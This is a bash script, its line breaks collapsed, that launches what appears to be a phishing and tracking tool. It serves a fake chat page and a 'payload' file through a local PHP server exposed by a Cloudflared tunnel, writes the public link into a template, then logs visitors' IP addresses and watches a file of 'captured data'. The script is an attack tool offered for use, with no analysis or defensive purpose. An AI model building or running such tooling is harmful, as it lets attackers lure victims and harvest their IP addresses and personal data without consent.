#!/bin/bash

banner() { clear printf "\e[1;92m" cat << "EOF"


---

| | | | ___  _ __ ___   | | | || |/ _ | '  _ \ / _ | |  _  | () | | | | | | (| | || ||_/|| || ||_,_|

EOF printf "\e[1;97m" }

stop() { pkill -f cloudflared > /dev/null 2>&1 pkill -f php > /dev/null 2>&1 pkill -f ssh > /dev/null 2>&1 exit 1 }

catch_ip() { echo "[+] Waiting for IP..." while true; do if [[ -s ip.txt ]]; then ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r') if [[ -n "$ip" ]]; then echo -e "\n[+] IP: $ip" cat ip.txt >> saved.ip.txt echo -e "\n[+] Saved to saved.ip.txt" > ip.txt fi fi sleep 1 done }

cf_server() { echo -e "\n[+] Starting PHP server..." php -S 127.0.0.1:3333 > php.log 2>&1 & sleep 2 echo -e "[+] Starting Cloudflared tunnel..." ./cloudflared tunnel -url 127.0.0.1:3333 --logfile cf.log > cloudflared.log 2>&1 & sleep 5

link=$(grep -o 'https://[-a-zA-Z0-9@:%.+~#=]{1,256}.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)' cloudflared.log | head -n1) if [[ -n "$link" ]]; then echo -e "[+] Link: $link" sed "s|FORWARDING_LINK|$link|g" template.php > index.php else echo -e "[-] Direct link not found. Check cloudflared.log" stop fi }

checkfound() { echo "\n[*] Monitoring captured data..." while true; do [[ -f "data.txt" ]] && tail -n 20 data.txt sleep 1 done }

dependencies() { for cmd in php curl unzip wget; do if ! command -v $cmd > /dev/null; then echo "[!] $cmd is not installed. Install it first." exit 1 fi done }

prepare_files() { if [[ ! -f "index_chat.html" || ! -f "payload" || ! -f "template.php" ]]; then echo "[!] Required files are missing: index_chat.html, payload, or template.php." exit 1 fi cp -f index_chat.html index.html cp -f payload payload.js

> ip.txt data.txt }



banner dependencies prepare_files cf_server & catch_ip & checkfound

